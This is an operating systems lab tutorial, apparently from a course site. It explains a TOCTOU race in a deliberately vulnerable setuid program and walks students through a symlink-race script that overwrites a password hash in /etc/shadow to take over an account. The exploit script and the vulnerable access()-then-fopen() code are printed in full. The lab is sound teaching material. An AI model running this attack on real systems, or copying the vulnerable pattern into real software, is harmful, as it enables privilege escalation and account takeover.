---
title: The Vulnerable Root Program
permalink: /os_labs/lab3_vulnerableprog
key: labs-cli
license: false
layout: article
nav_key: os_labs
sidebar:
  nav: os_labs
license: false
aside:
  toc: true
show_edit_on_github: false
show_date: false
---

Our vulnerable program is can be found in `/Root/vulnerable_root_prog`. Open `/FilesForRoot/vulnerable_root_prog.c` to find out what it does.

The program expects <span style="color:#f77729;"><b>two</b></span> arguments: to be stored at `char *fileName`, and `char *match`. It is a _supposedly secure_ program that will allow `root` to replace `*match` string inside `*fileName` with an SHA-512 hashed password `00000`.

```java
    if (argc < 3)
    {
        printf("ERROR, no file supplied, and no username supplied. Exiting now.\n");
        return 0;
    }

    char *fileName = argv[1];
    char *match = argv[2];
    FILE *fileHandler;

    ....
```

It will then <span style="color:#f77729;"><b>check</b></span> with the `access` <span style="color:#f7007f;"><b>system call</b></span> on whether or not the caller of this program (it's REAL ID) has <span style="color:#f7007f;"><b>permission</b></span> to access the target `fileName`:

```java
    if (!access(fileName, W_OK))
    {
        printf("Access Granted \n");
        ....

    }
```

Below we paste the documentation for `access()` from Linux man page:

> `access()` checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.
>
> The check is done using the calling process's <span style="color:#f77729;"><b>real</b></span> `UID` and `GID`, rather than the <span style="color:#f77729;"><b>effective IDs</b></span> as is done when actually attempting an operation (e.g., open, fopen, execvp, etc) on the file. Similarly, for the root user, the check uses the set of permitted capabilities rather than the set of effective capabilities; and for non-root users, the check uses an empty set of capabilities.
>
> This allows set-user-ID programs and capability-endowed programs to easily determine the invoking user's authority. In other words, `access()` does not answer the "can I read/write/execute this file?" question. It answers a slightly different question: "(assuming I'm a setuid binary) <span style="color:#f77729;"><b>can the ACTUAL user who invoked me</b></span> read/write/execute this file?", which gives set-user-ID programs the possibility to prevent malicious users from causing them to read files which users shouldn't be able to read.”

Other system calls: `execvp`, `open` that we used in `rootdo` or standard `sudo` only checks the <span style="color:#f77729;"><b>effective</b></span> ID of the calling process, <span style="color:#f7007f;"><b>not the real ID</b></span>.
{:.warning}

`rootdo` runs with effective <span style="color:#f77729;"><b>root</b></span> privileges (<span style="color:#f77729;"><b>effective</b></span>, not real, since the caller to `rootdo` is only normal user), and that’s enough to run the `cat /etc/shadow` program since `cat` doesn’t utilise `access()` to check for the calling process.

On the other hand, `vulnerable_root_prog` <span style="color:#f7007f;"><b>tries</b></span> to be more secure by using the `access` system call to <span style="color:#f7007f;"><b>prevent users with elevated privileges to modify files that do not belong to them</b></span>.

However, `vulnerable_root_prog` "security" attempt fails miserably and ends up being susceptible to a particular race condition attack due this weakness called TOCTOU (time-of-check time-of-update)!
{:.error}

# TOCTOU Bug

The time-of-check to time-of-use (often abbreviated as`TOCTOU`, `TOCTTOU` or `TOC/TOU`) is a class of software bug caused by a race condition involving:

- The <span style="color:#f77729;"><b>checking</b></span> of the state of a part of a system (such as this check in `vulnerable_root_prog` using `access`),
- And the <span style="color:#f77729;"><b>actual use</b></span> of the results of that check

We <span style="color:#f77729;"><b>exaggerate</b></span> the `DELAY` between:

1. The TIME of <span style="color:#f77729;"><b>CHECK</b></span> of the file using `access` and
2. The TIME OF <span style="color:#f77729;"><b>USE</b></span> (actual usage of the file) using `fopen`
   by setting `sleep(DELAY)` in between the two instructions, where `DELAY` is specified as 1 to simulate 1 second delay.

```java
...
    if (!access(fileName, W_OK))
    {
        printf("Access Granted \n");
        /*Simulating the Delay*/
        sleep(DELAY); // sleep for 1 sec, exaggerate delay
        ...

        int byte_index = 0;
        int previous_byte_index = 0;
        int byte_match = -1;

        FILE *fp = fopen(fileName, "r+");
        ...
    }
```

Consider the `vulnerable_root_prog` being called by a user to modify a text file <span style="color:#f77729;"><b>belonging</b></span> to the user account as such:
<img src="/50005/assets/images/lab2/11.png"  class="center_seventy"/>

The `access()` check of course grants the normal user caller to modify `userfile.txt` because indeed it <span style="color:#f77729;"><b>belongs</b></span> to the normal user (<span style="color:#f77729;"><b>ubuntu</b></span> in the screenshot above).

The output doesn't make sense as of now, but we will explain what those `hash` values are about really soon. The `vulnerable_root_prog` does two things:

1. Accepts a `fileName` and a string inside that file to `match`.
2. It will <span style="color:#f77729;"><b>replace</b></span> that string inside the file with the hash value: `$6$jPSpZ3iS84semtGU$DLwyTleAM2Of8NzDrwwNTnuSamJlnTx6NlMgbhPT5L8POT/J1MSCPucOAp1Qt3zRClS2NWT.RksROF9R1XLrn0` if `access()` system call grants permission.

## Symbolic Link

We will soon exploit this bug with <span style="color:#f77729;"><b>symbolic link</b></span>.

A <span style="color:#f77729;"><b>symbolic</b></span> link is a special kind of file that points to (reference) another file, much like a <span style="color:#f77729;"><b>shortcut</b></span> in Windows or a Macintosh alias. It contains a text string that is <span style="color:#f7007f;"><b>automatically interpreted</b></span> and followed by the operating system as a path to another file or directory.
{:.warning}

### Task 9

`TASK 9:`{:.info} Creating symbolic link.

For instance, we can create a text file with:

```console
echo "good morning" > goodmorning.txt
```

Then we can create a <span style="color:#f77729;"><b>symbolic link</b></span> using the command:

```console
ln -s <source> <symlink>
```

In this example below, we created a `goodmorning_symlink.txt` that <span style="color:#f77729;"><b>points</b></span> to the actual file `goodmorning.txt`:
<img src="/50005/assets/images/lab2/12.png"  class="center_seventy"/>

Note: there are different terminologies for `ln` system program manual. POSIX states `target --> source` while GNU states `link_name --> target`, and hence the word _target_ alone can mean either the symlink or the actual file depending on which manual you read. Be careful!
{:.info}

## Exploiting the TOCTOU Bug with SymLink

During this <span style="color:#f77729;"><b>delay</b></span> between <span style="color:#f77729;"><b>checking</b></span> (with `access`) and <span style="color:#f77729;"><b>usage</b></span> (with `fopen`):

1. A <span style="color:#f7007f;"><b>malicious</b></span> attacker can <span style="color:#f7007f;"><b>replace</b></span> the actual file `text.txt` into a <span style="color:#f77729;"><b>symbolic link</b></span> pointing to a protected file, e.g: `/etc/shadow`
2. Since `fopen` only checks <span style="color:#f77729;"><b>effective</b></span> user ID, and `vulnerable_root_prog` has its `SUID` bit <span style="color:#f77729;"><b>set</b></span> (runs <span style="color:#f77729;"><b>effectively</b></span> as `root` despite being called by only normal user), the “supposedly secure” <span style="color:#f77729;"><b>rootprog</b></span> can end up allowing normal user to gain elevated privileges to <span style="color:#f77729;"><b>MODIFY</b></span> protected file like `/etc/shadow`.

In the screenshot below, we created a <span style="color:#f77729;"><b>symbolic link</b></span> `userfile.txt` to point to `/etc/shadow`, resulting in the regular user being unable to `cat userfile.txt`.
<img src="/50005/assets/images/lab2/13.png"  class="center_seventy"/>

We have written the program to create the symbolic link for you. It is inside `/User/symlink.c`.

## Race Condition

The malicious attacker has to <span style="color:#f77729;"><b>attack</b></span> and can only <span style="color:#f77729;"><b>successfully</b></span> launch the attack (modifying `userfile.txt -> /etc/shadow`) during that <span style="color:#f77729;"><b>time window</b></span> between <span style="color:#f77729;"><b>time-of-check</b></span> (`access`) and <span style="color:#f7007f;"><b>time-of-use</b></span> (`fopen`), hence the term “race condition vulnerability attack” or “a bug caused by race condition”.

The attacker has to literally <span style="color:#f7007f;"><b>RACE</b></span> with the `vulnerable_root_prog` to <span style="color:#f77729;"><b>quickly</b></span> change the `userfile.txt` into a symbolic link pointing to `/etc/shadow` <span style="color:#f77729;"><b>ONLY</b></span> on this very specific time window of <span style="color:#f77729;"><b>AFTER</b></span> the `access()` check and <span style="color:#f77729;"><b>BEFORE</b></span> the `fopen()`.
{:.error}

# The Attack

## /etc/shadow

We will use this TOCTOU bug in `vulnerable_root_prog` to <span style="color:#f77729;"><b>modify</b></span> the content of the file: `/etc/shadow`.

`/etc/shadow` is <span style="color:#f77729;"><b>shadow</b></span> password file; a system file in <span style="color:#f77729;"><b>Linux</b></span> that stores <span style="color:#f77729;"><b>hashed</b></span> user passwords and is accessible only to the root user, preventing unauthorized users or malicious actors from breaking into the system.
{:.warning}

Try reading it using `sudo cat /etc/shadow`. You will find that the lines have the following format:

```
usernm:$y$Apj1GQn.U$ZWWEtt19A8:17736:0:99999:7:::
[----] [---------------------] [---] - [---] ----
|                 |              |   |   |   |||+-----------> 9. Unused
|                 |              |   |   |   ||+------------> 8. Expiration date
|                 |              |   |   |   |+-------------> 7. Inactivity period
|                 |              |   |   |   +--------------> 6. Warning period
|                 |              |   |   +------------------> 5. Maximum password age
|                 |              |   +----------------------> 4. Minimum password age
|                 |              +--------------------------> 3. Last password change
|                 +-----------------------------------------> 2. Hashed Password
+-----------------------------------------------------------> 1. Username
```

Pay attention to segment <span style="color:#f77729;"><b>2</b></span>:
It contains the password of the `usernm` using the `$type$salt$hashed` format. 1.`$type` is the method cryptographic hash <span style="color:#f77729;"><b>algorithm</b></span> and can have the following values:

- `$1$` – MD5
- `$2a$` – Blowfish
- `$y$` – yescrypt
- `$5$` – SHA-256
- `$6$` – SHA-512

If the hashed password field contains an asterisk (\*) or exclamation point (!), the user will not be able to login to the system using password authentication. Other login methods like key-based authentication or switching to the user are still allowed (out of scope). You can read more about the file [here](https://www.cyberciti.biz/faq/understanding-etcshadow-file/) but it's not crucial. Let's move on.

## Replacing Hashed Password in /etc/shadow

We <span style="color:#f7007f;"><b>aim</b></span> to:

1. Replace the targeted `username` entry in `/etc/shadow` with a <span style="color:#f7007f;"><b>new Hashed Password</b></span> section
2. So that we can `login` to this targeted `username` using <span style="color:#f7007f;"><b>preset password</b></span> `00000` (five zeroes), effectively <span style="color:#f77729;"><b>overriding</b></span> the password you set earlier.
3. "We" being <span style="color:#f77729;"><b>regular user account</b></span> (NOT root!) but with the help of this TOCTOU bug from `vulnerable_root_prog`.

These targeted `username` is none other than `test-user-0` that you have created earlier.
{:.warning}

### Task 10

`TASK 10:`{:.info} Launch attack that does the 3 things above by running `exploit.sh`.

While logged in as a regular user (your original username), change your directory to `/User/` and run the script `exploit.sh`:

```console
cd User
./exploit.sh
```

<img src="/50005/assets/images/lab2/17.png"  class="center_full"/>

The program will run for <span style="color:#f77729;"><b>awhile</b></span> (20-30 secs) and eventually <span style="color:#f7007f;"><b>stop</b></span> with such message:

<img src="/50005/assets/images/lab2/18.png"  class="center_full"/>

If you do a `cat /etc/shadow` right now, notice how `test-user-0` account hashed password section has been changed to match that `replacement_text` in `vulnerable_root_prog`:

<img src="/50005/assets/images/lab2/19.png"  class="center_full"/>

## Login to target user account

### Task 11

`TASK :`{:.info} Login to user account `test-user-0` with password `00000`
Now you can login to `test-user-0` account with <span style="color:#f77729;"><b>password</b></span>: `00000` instead of your originally set password:

<img src="/50005/assets/images/lab2/20.png"  class="center_full"/>

We have <span style="color:#f77729;"><b>successfully</b></span> changed a supposedly <span style="color:#f7007f;"><b>protected</b></span> `/etc/shadow` file while logged in as a <span style="color:#f77729;"><b>regular user</b></span> (ubuntu in the example above).

## What Happened?

Open `exploit.sh` file inside `/User/` directory:

```bash
#!/bin/sh
# exploit.sh

# note the backtick ` means assigning a command to a variable
OLDFILE=`ls -l /etc/shadow`
NEWFILE=`ls -l /etc/shadow`

# continue until THE ROOT_FILE.txt is changed
while [ "$OLDFILE" = "$NEWFILE" ]
do
    rm -f userfile.txt
    # create userfile again
    cp userfile_original.txt userfile.txt

    # the following is done simultanously
    # if a command is terminated by the control operator &, the shell executes the command in the background in a subshell.
    # the shell does not wait for the command to finish, and the return status is 0.
    # on the other hand, commands separated by a ; are executed sequentially; the shell waits for each command to terminate in turn.
    # the return status is the exit status of the last command executed.
    ../Root/vulnerable_root_prog userfile.txt test-user-0 & ./symlink userfile.txt /etc/shadow & NEWFILE=`ls -l /etc/shadow`

done

echo "SUCCESS! The root file has been changed"
```

The first two lines create a variable called `OLDFILE` and `NEWFILE`, containing the file information of `/etc/shadow`.

```
OLDFILE=`ls -l /etc/shadow`
NEWFILE=`ls -l /etc/shadow`
```

Then, the main loop is repeated <span style="color:#f77729;"><b>until</b></span> `/etc/shadow` is successfully changed (different <span style="color:#f77729;"><b>timestamp</b></span> and <span style="color:#f77729;"><b>size</b></span>):

1. Remove existing `userfile.txt` if any (from previous loop)
2. Then, create `userfile.txt` (this line can be replaced by any other instructions that create this `userfile.txt`)
3. Then, runs 3 commands in <span style="color:#f77729;"><b>succession</b></span>:
   1. `../Root/vulnerable_root_prog userfile.txt test-user-0`: runs the vulnerable program with `userfile.txt`, belonging to currently logged in user account and the <span style="color:#f77729;"><b>targeted</b></span> username.
   2. `./symlink userfile.txt /etc/shadow`: immediately, executes the `symlink` program to change `userfile.txt` to <span style="color:#f77729;"><b>point</b></span> to `/etc/shadow`.
   3. ``NEWFILE=`ls -l /etc/shadow` ``: check the file info of `/etc/shadow`and store it into variable`NEWFILE`; to be used in the <span style="color:#f77729;"><b>next</b></span> loop check

Step (3.1) and (3.2) above are <span style="color:#f77729;"><b>racing</b></span>, and the script terminates when `/etc/shadow` has been successfully changed.
